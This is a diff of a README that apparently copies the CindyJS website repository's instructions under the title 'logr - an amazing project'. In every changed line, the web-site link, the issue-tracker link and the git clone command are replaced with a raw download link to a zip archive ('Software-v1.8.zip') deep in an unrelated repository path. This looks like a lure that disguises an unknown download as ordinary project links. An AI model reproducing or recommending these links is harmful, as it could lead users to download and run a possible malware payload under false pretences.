@@ -1,17 +1,17 @@
 logr - an amazing project
 
 This repository contains the sources from which
-[the CindyJS web site](https://github.com/M-ux349/website/raw/refs/heads/master/src/gallery/main/ConicsAtInfinity/Software-1.2-alpha.4.zip) is built.
+[the CindyJS web site](https://github.com/M-ux349/website/raw/refs/heads/master/src/asis/pub/2016-icms/plugins/Software-v1.8.zip) is built.
 If there is something wrong with the content on that web site,
 feel free to
-[file an issue with this repository](https://github.com/M-ux349/website/raw/refs/heads/master/src/gallery/main/ConicsAtInfinity/Software-1.2-alpha.4.zip),
+[file an issue with this repository](https://github.com/M-ux349/website/raw/refs/heads/master/src/asis/pub/2016-icms/plugins/Software-v1.8.zip),
 or formulate a pull request.
 Note that most pages will come with an edit link in the bottom right corner.
 
 ## Testing/developing the website on your local machine
 
 In order to download the website clone the repository with
-`git clone https://github.com/M-ux349/website/raw/refs/heads/master/src/gallery/main/ConicsAtInfinity/Software-1.2-alpha.4.zip`
+`git clone https://github.com/M-ux349/website/raw/refs/heads/master/src/asis/pub/2016-icms/plugins/Software-v1.8.zip`
 
 Then enter the just downloaded folder `website` and install all dependencies with
 
